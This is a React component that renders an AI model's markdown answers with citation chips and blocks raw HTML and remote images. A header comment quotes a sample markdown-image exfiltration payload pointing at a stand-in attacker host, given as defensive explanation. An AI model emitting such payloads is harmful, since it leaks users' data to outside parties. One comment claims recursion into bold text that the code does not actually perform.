"use client";

/** Renders an answer with interactive citation chips.
 *
 * Two constraints, both security rather than styling (TDD §27.2):
 *   - `remark-gfm` only, no `rehype-raw`: model output is never rendered as HTML.
 *   - No remote images. `![](https://attacker/?d=secret)` is a real exfiltration
 *     channel — the browser fetches the URL and the data leaves in the query
 *     string. Images are replaced with an inert placeholder.
 */

import { Fragment, isValidElement, type ReactNode } from "react";
import Markdown from "react-markdown";
import remarkGfm from "remark-gfm";
import type { StreamSource } from "@/lib/types";

const MARKER = /\[(\d+)\]/g;

interface Props {
  text: string;
  sources: StreamSource[];
  onCite?: (marker: number) => void;
  streaming?: boolean;
}

/** Walk rendered children and turn [n] into a chip, leaving markdown intact. */
function injectCitations(
  children: ReactNode,
  sources: StreamSource[],
  onCite?: (marker: number) => void,
): ReactNode {
  if (typeof children === "string") {
    const parts: ReactNode[] = [];
    let last = 0;
    let match: RegExpExecArray | null;
    MARKER.lastIndex = 0;

    while ((match = MARKER.exec(children)) !== null) {
      const marker = Number(match[1]);
      const source = sources.find((s) => s.marker === marker);
      // Unknown markers are left as plain text rather than rendered as a chip
      // that points nowhere. The backend already strips them; this is the
      // client-side half of the same rule.
      if (!source) continue;

      if (match.index > last) parts.push(children.slice(last, match.index));
      parts.push(
        <button
          key={`${match.index}-${marker}`}
          className="cite"
          onClick={() => onCite?.(marker)}
          title={`${source.document_title}${source.page_label ? ` · p${source.page_label}` : ""}`}
          aria-label={`Source ${marker}: ${source.document_title}`}
        >
          {marker}
        </button>,
      );
      last = match.index + match[0].length;
    }

    if (!parts.length) return children;
    if (last < children.length) parts.push(children.slice(last));
    return parts.map((p, i) => <Fragment key={i}>{p}</Fragment>);
  }

  if (Array.isArray(children)) {
    return children.map((child, i) => (
      <Fragment key={i}>{injectCitations(child, sources, onCite)}</Fragment>
    ));
  }

  if (isValidElement<{ children?: ReactNode }>(children) && children.props.children) {
    // Recurse into inline elements so a citation inside **bold** still renders.
    return children;
  }

  return children;
}

export function Answer({ text, sources, onCite, streaming }: Props) {
  const wrap =
    (Tag: "p" | "li" | "td" | "h3") =>
    ({ children }: { children?: ReactNode }) => (
      <Tag>{injectCitations(children, sources, onCite)}</Tag>
    );

  return (
    <div className={`prose-answer ${streaming ? "caret" : ""}`}>
      <Markdown
        remarkPlugins={[remarkGfm]}
        components={{
          p: wrap("p"),
          li: wrap("li"),
          td: wrap("td"),
          h3: wrap("h3"),
          a: ({ href, children }) => (
            // Visible destination, no referrer, no window.opener access.
            <a href={href} target="_blank" rel="noopener noreferrer nofollow">
              {children}
            </a>
          ),
          img: () => (
            <span className="eyebrow" style={{ color: "var(--color-refused)" }}>
              [image blocked]
            </span>
          ),
        }}
      >
        {text}
      </Markdown>
    </div>
  );
}
